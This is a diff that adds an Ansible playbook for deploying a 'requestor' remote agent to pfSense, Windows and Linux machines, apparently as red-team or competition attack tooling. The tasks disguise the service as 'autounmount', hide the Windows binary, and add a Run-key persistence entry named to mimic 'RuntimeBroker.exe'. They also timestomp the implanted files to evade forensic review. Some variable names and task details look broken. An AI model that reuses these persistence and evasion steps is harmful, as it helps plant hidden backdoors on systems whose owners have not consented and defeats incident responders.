@@ -1,0 +1,113 @@
+- name: REQUESTOR | Define Linux Distros
+  set_fact:
+    linux_distros: ["RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Debian", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
+
+######################################################################
+#
+# pfSense Boxes (FreeBSD)
+#
+######################################################################
+- name: REQUESTOR | Copy binary | pfSense
+  copy:
+    src: requestor.pf
+    dest: "{{ pfsense_binary }}"
+    mode: 755
+  when: ansible_facts['os_family'] == "FreeBSD"
+
+- name: REQUESTOR | Copy service file | pfSense
+  copy:
+    src: requestor.service.pf
+    dest: "{{ pfsense_service }}"
+    mode: 644
+  when: ansible_facts['os_family'] == "FreeBSD"
+
+- name: REQUESTOR | Start service | pfSense
+  ansible.builtin.service:
+    name: autounmount
+    state: started
+  when: ansible_facts['os_family'] == "FreeBSD"
+
+- name: REQUESTOR | Timestomp binary | pfSense
+  file:
+    path: "{{ pfsense_binary }}"
+    modification_time: "{{ timestomp_time }}"
+
+- name: REQUESTOR | Timestomp service file | pfSense
+  file:
+    path: "{{ pfsense_service }}"
+    modification_time: "{{ timestomp_time }}"
+
+
+######################################################################
+#
+# Windows Boxes
+#
+######################################################################
+
+- name: REQUESTOR | Copy remote agent | Windows
+  copy:
+    src: "requestor.exe"
+    dest: "{{ windows_binary }}"
+  when: ansible_facts['os_family'] == "Windows"
+
+- name: CONSTCTRL | Hide agent | Windows
+  win_command: "attrib +h '{{ windows_binary }}'"
+  when: inventory_hostname_short == 'squid' or inventory_hostname_short == 'drill' or inventory_hostname_short == 'penguin' or inventory_hostname_short == 'sealion' or inventory_hostname_short == 'tank'
+
+- name: REQUESTOR | Add run key persistence | Windows
+  win_regedit: 
+    path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+    name: "RuntimeBroker.exe"
+    data: "cmd.exe /c {{ windows_binary }}"
+    type: string
+  when: ansible_facts['os_family'] == "Windows"
+
+- name: REQUESTOR | Run agent | Windows
+  win_shell: 'runas /trustlevel:0x20000 {{ windows_binary_name }}'
+  async: 45
+  poll: 0
+  args:
+    chdir: "{{ windows_binary_directory }}"
+  when: ansible_facts['os_family'] == "Windows"
+
+######################################################################
+#
+# Linux Boxes
+#
+######################################################################
+
+- name: REQUESTOR | Copy binary | Linux
+  copy:
+    src: requestor.linux
+    dest: "{{ linux_binary }}"
+    mode: 755
+  when: ansible_os_family in linux_distros
+
+- name: REQUESTOR | Copy service file | Linux
+  copy:
+    src: requestor.service.linux
+    dest: "{{ linux_servicelinux_service }}"
+    mode: 755
+  when: ansible_os_family in linux_distros
+
+- name: REQUESTOR | Reload Service Damemons | Linux
+  ansible.builtin.systemd:
+    daemon_reload: yes
+  when: ansible_os_family in linux_distros
+
+- name: REQUESTOR | Enable and run service | Linux
+  ansible.builtin.service:
+    name: "{{ linux_service_name }}"
+    enabled: yes
+    state: started
+  when: ansible_os_family in linux_distros
+
+- name: REQUESTOR | Timestomp binary | Linux
+  file:
+    path: "{{ linux_binary }}"
+    modification_time: "{{ timestomp_time }}"
+
+- name: REQUESTOR | Timestomp service file | Linux
+  file:
+    path: "{{ linux_service }}"
+    modification_time: "{{ timestomp_time }}"
